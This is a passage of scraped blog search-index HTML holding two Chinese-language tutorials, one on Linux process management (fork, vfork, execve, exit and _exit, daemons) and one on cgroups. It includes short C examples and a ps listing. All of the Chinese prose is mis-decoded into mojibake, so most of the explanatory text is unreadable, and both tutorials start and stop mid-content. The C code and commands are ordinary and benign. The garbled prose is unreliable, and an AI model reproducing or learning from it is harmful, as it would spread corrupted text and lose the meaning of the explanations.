&lt;p&gt;&lt;code&gt;unistd.h&lt;/code&gt;å°è£…äº†ç±»UNIXç³»ç»Ÿä¸‹çš„å¾ˆå¤šå›ºå®šåç§°çš„system_callç³»ç»Ÿè°ƒç”¨ã€‚æ‰€ä»¥ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ä¾èµ–äºç¼–è¯‘å™¨ï¼Œä¾èµ–äºæ“ä½œç³»ç»Ÿçš„ã€‚&lt;/p&gt;
&lt;p&gt;çˆ¶è¿›ç¨‹è°ƒç”¨&lt;code&gt;fork&lt;/code&gt;å‡½æ•°åˆ›å»ºå­è¿›ç¨‹ï¼Œä¼šåœ¨çˆ¶è¿›ç¨‹ä¸­è¿”å›å­è¿›ç¨‹çš„è¿›ç¨‹idï¼Œåœ¨å­è¿›ç¨‹ä¸­è¿”å›0ã€‚çˆ¶è¿›ç¨‹æ— æ³•é€šè¿‡å‡½æ•°è·å–å­è¿›ç¨‹idï¼Œè€Œå­è¿›ç¨‹å¯ä»¥é€šè¿‡&lt;code&gt;getppid()&lt;/code&gt;è·å¾—çˆ¶è¿›ç¨‹idã€‚&lt;/p&gt;
&lt;p&gt;é€šå¸¸&lt;code&gt;fork&lt;/code&gt;å‡½æ•°æœ‰ä¸¤ç§ç”¨æ³•ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;çˆ¶è¿›ç¨‹å¸Œæœ›å¤åˆ¶è‡ªå·±ï¼Œä½¿çˆ¶å­è¿›ç¨‹æ‰§è¡Œä¸åŒçš„ä»£ç ã€‚ä¾‹å¦‚ç½‘ç»œæœåŠ¡ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè¯·æ±‚è¾¾åˆ°æ—¶ï¼Œåˆ›å»ºå­è¿›ç¨‹æ‰§è¡Œæ­¤è¯·æ±‚ï¼Œçˆ¶è¿›ç¨‹ç»§ç»­ç­‰å¾…æ–°è¯·æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªè¿›ç¨‹è¦æ‰§è¡Œä¸åŒçš„ç¨‹åºã€‚å­è¿›ç¨‹ä»&lt;code&gt;fork&lt;/code&gt;å‡½æ•°è¿”å›åï¼Œç«‹å³è°ƒç”¨&lt;code&gt;exec&lt;/code&gt;å‡½æ•°(åˆ›å»ºäº†ä¸€ä¸ªå…¨æ–°è¿›ç¨‹)ï¼Œå­è¿›ç¨‹åœ¨&lt;code&gt;fork&lt;/code&gt;å‡½æ•°å’Œ&lt;code&gt;exec&lt;/code&gt;å‡½æ•°ä¹‹é—´å¯ä»¥æ›´æ”¹è‡ªå·±çš„å±æ€§ã€‚ä¾‹å¦‚&lt;code&gt;shell&lt;/code&gt;ä¸­ï¼Œå­è¿›ç¨‹åˆ›å»ºåç«‹å³è°ƒç”¨&lt;code&gt;exec&lt;/code&gt;å‡½æ•°ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸€ä¸ªè¿›ç¨‹è°ƒç”¨äº†&lt;code&gt;fork&lt;/code&gt;å‡½æ•°åï¼Œç³»ç»Ÿå…ˆç»™æ–°çš„è¿›ç¨‹åˆ†é…èµ„æºï¼ŒæŠŠåŸæ¥çš„å˜é‡èµ‹å€¼åˆ°å­è¿›ç¨‹ä¸­ï¼Œåªæœ‰å°‘æ•°å˜é‡åŸŸåŸæ¥è¿›ç¨‹çš„å˜é‡ä¸åŒï¼Œç›¸å½“äºå…‹éš†äº†è‡ªå·±ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
    pid_t fpid;
    int count = 10;
    fpid = fork();
    printf(&amp;quot;fpid = %d\n&amp;quot;, fpid);
    if(fpid &amp;lt; 0) printf(&amp;quot;error\n&amp;quot;); // å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šè¿”å›ä¸€ä¸ªè´Ÿå€¼
    else if(fpid == 0) printf(&amp;quot;i am child process, my pid = %d, count = %d\n&amp;quot;, getpid(), ++count);
    else printf(&amp;quot;im child parent process, my pid = %d, count = %d\n&amp;quot;, getpid(), ++count);
    return 0;
    /*
        fpid = 3919
        im child parent process, my pid = 3918, count = 11
        fpid = 0
        i am child process, my pid = 3919, count = 11
    */
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;code&gt;vfork&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;vfork&lt;/code&gt;å‡½æ•°ä¸&lt;code&gt;fork&lt;/code&gt;å‡½æ•°ä¸åŒçš„åœ°æ–¹æ˜¯ï¼Œ&lt;code&gt;vfork&lt;/code&gt;å‡½æ•°ä¼šä¿è¯å­è¿›ç¨‹å…ˆè¿è¡Œï¼Œåœ¨å®ƒè°ƒç”¨&lt;code&gt;exec&lt;/code&gt;å‡½æ•°æˆ–è€…&lt;code&gt;exit&lt;/code&gt;å‡½æ•°ä¹‹åçˆ¶è¿›ç¨‹æ‰å¯èƒ½è¢«è°ƒåº¦è¿è¡Œï¼Œå­è¿›ç¨‹åœ¨è°ƒç”¨&lt;code&gt;exec&lt;/code&gt;æˆ–&lt;code&gt;exit&lt;/code&gt;å‡½æ•°ä¹‹å‰ä¸çˆ¶è¿›ç¨‹æ•°æ®æ˜¯å…±äº«çš„ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
    pid_t pid;
    int count = 0;
    pid = vfork();

    if(pid &amp;lt; 0) printf(&amp;quot;error.\n&amp;quot;);
    else if(pid == 0)
    {
        printf(&amp;quot;child, count = %d\n&amp;quot;, ++count);
        exit(0);
    }
    else printf(&amp;quot;father, count = %d\n&amp;quot;, ++count);

    return 0;
}
/*
    child, count = 1
    father, count = 2
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;exec&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;exec&lt;/code&gt;ä¸æ˜¯å•ä¸€çš„å‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªç³»åˆ—ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;execl(const char *path, const char *arg, ...);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ­¤å‡½æ•°å¯ä»¥å–ä»£è°ƒç”¨è¿›ç¨‹çš„å†…å®¹ï¼Œå­è¿›ç¨‹å¯ä»¥è°ƒç”¨&lt;code&gt;execve&lt;/code&gt;å‡½æ•°æ‰§è¡Œå¦ä¸€ä¸ªç¨‹åºã€‚å½“è°ƒç”¨&lt;code&gt;execve&lt;/code&gt;å‡½æ•°æ—¶ï¼Œè¿›ç¨‹æ‰§è¡Œçš„ç¨‹åºå®Œå…¨è¢«æ›¿æ¢ä¸ºæ–°ç¨‹åºï¼Œä½†å…¶è¿›ç¨‹IDå¹¶ä¸å˜ï¼Œåªæ˜¯ç”¨æ–°ç¨‹åºæ›¿æ¢äº†å½“å‰è¿›ç¨‹çš„æ­£æ–‡ã€æ•°æ®ã€å †å’Œæ ˆæ®µã€‚&lt;code&gt;execve&lt;/code&gt;å‡½æ•°æ—çš„å·¥ä½œè¿‡ç¨‹ä¸&lt;code&gt;fork&lt;/code&gt;å‡½æ•°å®Œå…¨ä¸åŒï¼Œ&lt;code&gt;fork&lt;/code&gt;å‡½æ•°æ˜¯åœ¨å¤åˆ¶ä¸€ä»½åŸè¿›ç¨‹ï¼Œè€Œ&lt;code&gt;execve&lt;/code&gt;å‡½æ•°æ˜¯ç”¨ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šçš„ç¨‹åºè¦†ç›–ç°åœ¨æœ‰è¿›ç¨‹ç©ºé—´ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;int execve(const char *filename, const char *argv[], const char *envp[])&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬1ä¸ªå‚æ•°&lt;code&gt;filename&lt;/code&gt;æ˜¯å¯æ‰§è¡Œç¨‹åºæ–‡ä»¶åç§°ï¼Œç¬¬2ä¸ªå‚æ•°&lt;code&gt;argv&lt;/code&gt;æ˜¯éœ€è¦ä¼ é€’ç»™å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ï¼Œç¬¬3ä¸ªå‚æ•°æ˜¯ç¯å¢ƒå˜é‡æ•°ç»„ï¼Œç¬¬2ã€3ä¸ªå‚æ•°éƒ½éœ€è¦æœ‰ç©ºæŒ‡é’ˆNULLä¸ºç»“æŸæ ‡è¯†ã€‚å¦‚æœè°ƒç”¨æˆåŠŸåˆ™åŠ è½½æ–°çš„ç¨‹åºä»å¯åŠ¨ä»£ç å¼€å§‹æ‰§è¡Œï¼Œä¸å†è¿”å›ï¼›å¦‚æœè°ƒç”¨å‡ºé”™åˆ™è¿”å›-1ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// mult.c
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
int main(int argc, char *argv[])
{
    int a = atoi(argv[1]);
    int b = atoi(argv[2]);
    printf(&amp;quot;%d * %d = %d\n&amp;quot;, a, b, a*b);
    return 0;
}

// main.c

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
int main()
{
    char *argv1[] = {&amp;quot;mult&amp;quot;, &amp;quot;2&amp;quot;, &amp;quot;10&amp;quot;, NULL};
    char *envp[] = {&amp;quot;PATH=/root&amp;quot;, NULL};
    execve(&amp;quot;./mult&amp;quot;, argv1, envp);
    return 0;
}

/*
    2 * 10 = 20
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;code&gt;exit&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è¿›ç¨‹é€€å‡ºçš„æ–¹å¼æœ‰ä»¥ä¸‹5ç§ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;main&lt;/code&gt;å‡½æ•°çš„è‡ªç„¶è¿”å›&lt;/li&gt;
&lt;li&gt;è°ƒç”¨&lt;code&gt;exit&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;li&gt;è°ƒç”¨&lt;code&gt;_exit&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;li&gt;è°ƒç”¨&lt;code&gt;abort&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;li&gt;æ¥æ”¶åˆ°èƒ½å¯¼è‡´è¿›ç¨‹ç»ˆæ­¢çš„ä¿¡å·&lt;code&gt;Ctrl+C(SIGINT)&lt;/code&gt;ï¼Œ&lt;code&gt;Ctrl+\(SIGQUIT)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å‰ä¸‰ç§æ˜¯æ­£å¸¸çš„ç»ˆæ­¢ï¼Œä½†æ— è®ºå“ªç§é‚£ç§ï¼Œè¿›ç¨‹ç»ˆæ­¢æ—¶éƒ½å°†æ‰§è¡Œç›¸åŒçš„å…³é—­æ‰“å¼€çš„æ–‡ä»¶æ“ä½œï¼Œé‡Šæ”¾å ç”¨çš„å†…å®¹ç­‰èµ„æºã€‚&lt;/p&gt;
&lt;p&gt;å½“ç¨‹åºæ‰§è¡Œåˆ°&lt;code&gt;exit&lt;/code&gt;å’Œ&lt;code&gt;_exit&lt;/code&gt;å‡½æ•°æ—¶ï¼Œä¼šæ— æ¡ä»¶åœä¸‹å‰©ä¸‹çš„æ‰€æœ‰æ“ä½œï¼Œæ¸…æ¥šåŒ…æ‹¬PCBåœ¨å†…çš„å„ç§æ•°æ®ç»“æ„ï¼Œå¹¶ç»ˆæ­¢ç¨‹åºçš„è¿è¡Œã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1622093808796.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    printf(&amp;quot;EXIT&amp;quot;);
    exit(0);
}

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    printf(&amp;quot;EXIT&amp;quot;);
    _exit(0);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢è¿™ä¸¤ä¸ªä¾‹å­ï¼Œç¬¬ä¸€ä¸ªä¼šè¾“å‡º&lt;code&gt;EXIT&lt;/code&gt;ï¼Œè€Œç¬¬äºŒä¸ªä¸ä¼šè¾“å‡ºã€‚è¿™æ˜¯å› ä¸º&lt;code&gt;printf&lt;/code&gt;å‡½æ•°ä½¿ç”¨çš„æ—¶ç¼“å†²I/Oæ–¹å¼ï¼Œè¯¥å‡½æ•°åœ¨é‡åˆ°&lt;code&gt;\n&lt;/code&gt;æ¢è¡Œç¬¦æ—¶è‡ªåŠ¨ä»ç¼“å†²åŒºä¸­å°†è®°å½•è¯»å‡ºã€‚&lt;code&gt;exit(0)&lt;/code&gt;ä¼šåœ¨ç»ˆæ­¢è¿›ç¨‹å‰ï¼Œå°†ç¼“å†²I/Oå†…å®¹æ¸…é™¤æ‰ï¼Œæ‰€ä»¥å³ä½¿&lt;code&gt;printf&lt;/code&gt;å‡½æ•°é‡Œæ²¡æœ‰&lt;code&gt;\n&lt;/code&gt;æ¢è¡Œç¬¦ä¹Ÿä¼šæ‰“å°å‡ºã€‚è€Œ&lt;code&gt;_exit(0)&lt;/code&gt;æ²¡æœ‰æ¸…æ¥šç¼“å†²åŒºï¼Œå› æ­¤ä¸ä¼šæ‰“å°ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®ˆæŠ¤è¿›ç¨‹&#34;&gt;å®ˆæŠ¤è¿›ç¨‹&lt;/h2&gt;
&lt;p&gt;å®ˆæŠ¤è¿›ç¨‹(daemon)æ˜¯ä¸€ä¸ªåœ¨åå°è¿è¡Œçš„è¿›ç¨‹ï¼Œä¸ä¼šè¿æ¥åˆ°ä»»ä½•æ§åˆ¶ç»ˆç«¯ã€‚å®ƒä»¬å¸¸å¸¸åœ¨ç³»ç»Ÿå¼•å¯¼è£…å…¥æ—¶å¯åŠ¨ï¼Œä»…åœ¨ç³»ç»Ÿå…³é—­æ—¶æ‰ç»ˆæ­¢ã€‚UNIXç³»ç»Ÿæœ‰å¾ˆå¤šå®ˆæŠ¤è¿›ç¨‹ï¼Œå®ˆæŠ¤è¿›ç¨‹ç¨‹åºçš„åç§°é€šå¸¸ä»¥å­—æ¯â€œdâ€ç»“å°¾ï¼šä¾‹å¦‚ï¼Œsyslogd å°±æ˜¯æŒ‡ç®¡ç†ç³»ç»Ÿæ—¥å¿—çš„å®ˆæŠ¤è¿›ç¨‹ã€‚é€šè¿‡psè¿›ç¨‹æŸ¥çœ‹å™¨ ps -efj çš„è¾“å‡ºå®ä¾‹ï¼Œå†…æ ¸å®ˆæŠ¤è¿›ç¨‹çš„åå­—å‡ºç°åœ¨æ–¹æ‹¬å·ä¸­ï¼Œå¤§è‡´è¾“å‡ºå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;UID         PID   PPID   PGID    SID  C STIME TTY          TIME CMD           
root          1      0      1      1  0 10:29 ?        00:00:02 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root          2      0      0      0  0 10:29 ?        00:00:00 [kthreadd]
root          4      2      0      0  0 10:29 ?        00:00:00 [kworker/0:0H]
root          6      2      0      0  0 10:29 ?        00:00:00 [ksoftirqd/0]
root          7      2      0      0  0 10:29 ?        00:00:00 [migration/0]
root          8      2      0      0  0 10:29 ?        00:00:00 [rcu_bh]
root          9      2      0      0  0 10:29 ?        00:00:01 [rcu_sched]
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç”¨æˆ·æ€çš„å®ˆæŠ¤è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æ˜¯initè¿›ç¨‹ï¼Œå†…æ ¸æ€å®ˆæŠ¤è¿›ç¨‹çš„çˆ¶è¿›ç¨‹å¹¶éæ˜¯initè¿›ç¨‹ï¼Œ&lt;/p&gt;
&lt;p&gt;systemdï¼šhttps://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html&lt;/p&gt;
&lt;h2 id=&#34;è¿›ç¨‹çš„è°ƒåº¦&#34;&gt;è¿›ç¨‹çš„è°ƒåº¦&lt;/h2&gt;
&lt;p&gt;linuxè¿›ç¨‹çš„åˆ‡æ¢æ—¶é€šè¿‡__scheduleå‡½æ•°å®Œæˆã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®è°ƒåº¦å°±æ˜¯æ‰¾ä¸€ä¸ªå·²æœ‰çš„è¿›ç¨‹ï¼Œç„¶åè¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå¹¶è®©å®ƒæ‰§è¡Œè€Œå·²ã€‚&lt;/p&gt;
&lt;h2 id=&#34;çº¿ç¨‹&#34;&gt;çº¿ç¨‹&lt;/h2&gt;
">ã€linuxã€‘è¿›ç¨‹ç®¡ç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/cgroups/"" data-c="
          &lt;h2 id=&#34;åŸºæœ¬åŸç†&#34;&gt;åŸºæœ¬åŸç†&lt;/h2&gt;
&lt;p&gt;cgroupæ˜¯Linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œä¸»è¦ç”¨æ¥å¯¹å…±äº«èµ„æºè¿›è¡Œéš”ç¦»ã€é™åˆ¶ã€å®¡è®¡ç­‰ã€‚é€šè¿‡cgroupå¯ä»¥å°†å®šé¢çš„èµ„æºåˆ†é…ç»™ç‰¹å®šçš„ä¸€ç»„è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹ï¼Œç¼–è¯‘å†…æ ¸æ—¶æ‰“å¼€cgroupçš„ç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹ä½äºåŒä¸€ä¸ªcgroupï¼Œå°±æ˜¯æ ¹ï¼Œè¿™ä¸ªcgroupäº«æœ‰æ‰€æœ‰çš„ç³»ç»Ÿèµ„æºã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥é€šè¿‡cgroupæ–‡ä»¶ç³»ç»Ÿå»ºç«‹ä¸€ä¸ªæ–°çš„cgroupï¼Œç„¶åé…ç½®è¿™ä¸ªæ–°çš„cgroupï¼Œé…ç½®çš„å†…å®¹åŒ…æ‹¬ä¸ºå…¶åˆ†é…è¿›ç¨‹ã€åˆ†é…èµ„æºç­‰ã€‚è¿™ä¸ªåˆ›å»ºå’Œåˆ†é…çš„æ‰€æœ‰è¿‡ç¨‹éƒ½æ˜¯cgroupæ–‡ä»¶ç³»ç»Ÿé€šè¿‡&lt;code&gt;shell echo&lt;/code&gt;å†™è¿›æ–‡ä»¶å®Œæˆçš„ã€‚&lt;/p&gt;
&lt;p&gt;cgroupæœ¬èº«æ˜¯åˆ†å±‚çš„ï¼Œä¸€ä¸ªæ ¹å±‚ä¸‹é¢å°±åƒä¸€æ£µæ ‘ä¸€æ ·å¯ä»¥åˆ†å¾ˆå¤šå±‚ã€‚æ¯ä¸€å±‚çš„cgroupæ–‡ä»¶ç³»ç»Ÿç›®å½•ä¸‹éƒ½æœ‰è¯¥å±‚å¯¹åº”çš„èµ„æºé…ç½®æ–‡ä»¶ã€‚è¿™äº›å¯ä»¥é…ç½®çš„èµ„æºéƒ½æ˜¯cgroupå­ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;å­ç³»ç»Ÿ(subsystem)å®é™…ä¸Šæ˜¯cgroupå¯¹è¿›ç¨‹ç»„è¿›è¡Œèµ„æºæ§åˆ¶çš„å…·ä½“ä½“ç°ã€‚å­ç³»ç»Ÿå…·æœ‰å¤šç§ç±»å‹ï¼Œæ¯ä¸ªç±»å‹çš„å­ç³»ç»Ÿéƒ½ä»£è¡¨ä¸€ç§ç³»ç»Ÿèµ„æºï¼Œæ¯”å¦‚&lt;code&gt;CPUã€memory&lt;/code&gt;ç­‰ã€‚å½“åˆ›å»ºä¸€ä¸ªcgroupå®ä¾‹æ—¶ï¼Œå¿…é¡»è‡³å°‘æŒ‡å®šä¸€ç§å­ç³»ç»Ÿã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªæ–°å»ºçš„è¿›ç¨‹ç»„åœ¨è®¿é—®å­ç³»ç»Ÿå¯¹åº”çš„ç³»ç»Ÿèµ„æºæ—¶å°±æœ‰äº†ä¸€äº›é™åˆ¶ã€‚å…·ä½“çš„é™åˆ¶é¡¹ä¸å­ç³»ç»Ÿçš„ç±»å‹æœ‰å…³ã€‚&lt;/p&gt;
&lt;p&gt;cgroupä¸­è¿›ç¨‹ç»„çš„å±‚çº§å…³ç³»ä¸Linuxä¸­è¿›ç¨‹çš„å±‚çº§å…³ç³»æ¯”è¾ƒç±»ä¼¼ã€‚åœ¨Linuxæ“ä½œç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªè¿›ç¨‹é€šè¿‡&lt;code&gt;fork()&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨åˆ›å»ºäº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´å­˜åœ¨çˆ¶å­è¿™æ ·çš„ç­‰çº§å…³ç³»ï¼Œå¹¶ä¸”å­è¿›ç¨‹å¯ä»¥ç»§æ‰¿çˆ¶è¿›ç¨‹çš„ä¸€äº›èµ„æºã€‚ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹å½¢æˆä¸€ä¸ªæ ‘å½¢çš„ç­‰çº§å…³ç³»ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½å”¯ä¸€çš„ä½äºè¿›ç¨‹æ ‘ä¸­çš„æŸä¸€ä¸ªä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºcgroupæ¥è¯´ï¼Œcgroupå®ä¾‹ä¹‹é—´ä¹Ÿæ˜¯æœ‰å…·ä½“çº§åˆ«å…³ç³»çš„ï¼Œä½†æ˜¯å®ƒä»¬å±‚çº§å…³ç³»æ˜¯ä¸ºäº†æ›´ç»†ç²’åº¦çš„å¯¹è¿›ç¨‹ç»„è¿›è¡Œèµ„æºæ§åˆ¶ã€‚åŒæ—¶ï¼Œå­cgroupä¼šç»§æ‰¿çˆ¶cgroupçš„å¯¹èµ„æºçš„æ§åˆ¶å±æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å­ç³»ç»Ÿä¸å±‚çº§å…³ç³»&#34;&gt;å­ç³»ç»Ÿä¸å±‚çº§å…³ç³»&lt;/h3&gt;
&lt;p&gt;ä¸€ä¸ªå­ç³»ç»Ÿå°±æ˜¯ä¸€ä¸ªèµ„æºæ§åˆ¶å™¨ã€‚cgroupä¹ä¸ªå­ç³»ç»Ÿåˆ†åˆ«æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cpu&lt;/code&gt; å­ç³»ç»Ÿï¼Œä¸»è¦é™åˆ¶è¿›ç¨‹çš„ cpu ä½¿ç”¨ç‡ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cpuacct&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥ç»Ÿè®¡ cgroup ä¸­çš„è¿›ç¨‹çš„ cpu ä½¿ç”¨æŠ¥å‘Šã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cpuset&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥ä¸º cgroup ä¸­çš„è¿›ç¨‹åˆ†é…å•ç‹¬çš„ cpu èŠ‚ç‚¹æˆ–è€…å†…å­˜èŠ‚ç‚¹ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;memory&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥é™åˆ¶è¿›ç¨‹çš„ memory ä½¿ç”¨é‡ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blkio&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥é™åˆ¶è¿›ç¨‹çš„å—è®¾å¤‡ ioã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;devices&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥æ§åˆ¶è¿›ç¨‹èƒ½å¤Ÿè®¿é—®æŸäº›è®¾å¤‡ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net_cls&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥æ ‡è®° cgroup ä¸­è¿›ç¨‹çš„ç½‘ç»œæ•°æ®åŒ…ï¼Œç„¶åå¯ä»¥ä½¿ç”¨tc æ¨¡å—ï¼ˆtraffic controlï¼‰å¯¹æ•°æ®åŒ…è¿›è¡Œæ§åˆ¶ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;freezer&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥æŒ‚èµ·æˆ–è€…æ¢å¤ cgroup ä¸­çš„è¿›ç¨‹ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ns&lt;/code&gt; å­ç³»ç»Ÿï¼Œå¯ä»¥ä½¿ä¸åŒ cgroup ä¸‹é¢çš„è¿›ç¨‹ä½¿ç”¨ä¸åŒçš„ namespaceã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å†…æ ¸ä½¿ç”¨ cgroup ç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ä¸ª control group å¯¹æŸä¸€ä¸ªæˆ–è€…æŸå‡ ä¸ª cgroup å­ç³»ç»Ÿçš„èµ„æºé™åˆ¶ã€‚cgroup ç»“æ„ä½“å¯ä»¥ç»„ç»‡æˆä¸€é¢—æ ‘çš„å½¢å¼ï¼Œæ¯ä¸€æ£µcgroup ç»“æ„ä½“ç»„æˆçš„æ ‘ç§°ä¹‹ä¸ºä¸€ä¸ª cgroup å±‚çº§ç»“æ„ã€‚&lt;/p&gt;
&lt;p&gt;cgroupå±‚çº§ç»“æ„å¯ä»¥ attach ä¸€ä¸ªæˆ–è€…å‡ ä¸ª cgroupå­ç³»ç»Ÿï¼Œå½“å‰å±‚çº§ç»“æ„å¯ä»¥å¯¹å…¶ attach çš„ cgroup å­ç³»ç»Ÿè¿›è¡Œèµ„æºçš„é™åˆ¶ã€‚æ¯ä¸€ä¸ª cgroupå­ç³»ç»Ÿåªèƒ½è¢«attachåˆ°ä¸€ä¸ª cpu å±‚çº§ç»“æ„ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;å½“å»ºç«‹ç¬¬ä¸€ä¸ªcgroupæ—¶ï¼Œç³»ç»Ÿä¼šæŠŠæ‰€æœ‰çš„è¿›ç¨‹éƒ½æ”¾è¿›å»ï¼Œå¯¹åº”æ ‘å½¢ç»“æ„çš„æ ‘æ ¹ï¼Œä¾‹å¦‚&lt;code&gt;cat /sys/fs/cgroup/cpu/task&lt;/code&gt;ä¼šè¾“å‡ºæ‰€æœ‰è¿›ç¨‹çš„pidã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœåœ¨ä¸‹çº§cgroupï¼Œä¾‹å¦‚/cgroup/testçš„&lt;code&gt;task&lt;/code&gt;ä¸­å°†ä¸€ä¸ªè¿›ç¨‹çš„PID &lt;code&gt;echo&lt;/code&gt;åˆ°æ–‡ä»¶ï¼Œå°±ä¼šå‘ç°è¿™ä¸ªè¿›ç¨‹å¹¶æ²¡æœ‰ä»ä¸Šå±‚cgroupçš„&lt;code&gt;task&lt;/code&gt;åˆ—è¡¨ä¸­æ¶ˆå¤± ï¼Œè€Œæ˜¯åŒæ—¶å‡ºç°åœ¨äº†ä¸‹å±‚test cgroupçš„&lt;code&gt;task&lt;/code&gt;æ–‡ä»¶ä¸­ï¼Œè¿™å°±è¡¨ç¤ºè¯¥è¿›ç¨‹ç°åœ¨å½’test cgroupæ§åˆ¶ã€‚ä½†ç”±äºtest cgroupæ˜¯ä¸‹å±‚ cgroup ï¼Œæ‰€ä»¥è¿›ç¨‹ä¾ç„¶å­˜åœ¨äºä¸Šcgroupï¼Œè€ŒåŒå±‚çš„ cgroup ä¹‹é—´å´ä¸èƒ½å«æœ‰ç›¸åŒçš„è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¤ºä¾‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹å›¾æ—¶ä¸€ä¸ªcgroupç»“æ„å›¾ï¼ŒåŒ…å«ä¸¤ä¸ªå±‚çº§ï¼Œå³ç¬¬ä¸€å±‚çº§&lt;code&gt;cpu_mem&lt;/code&gt;å’Œç¬¬äºŒå±‚çº§&lt;code&gt;cpuset_net&lt;/code&gt;ã€‚&lt;/p&gt;
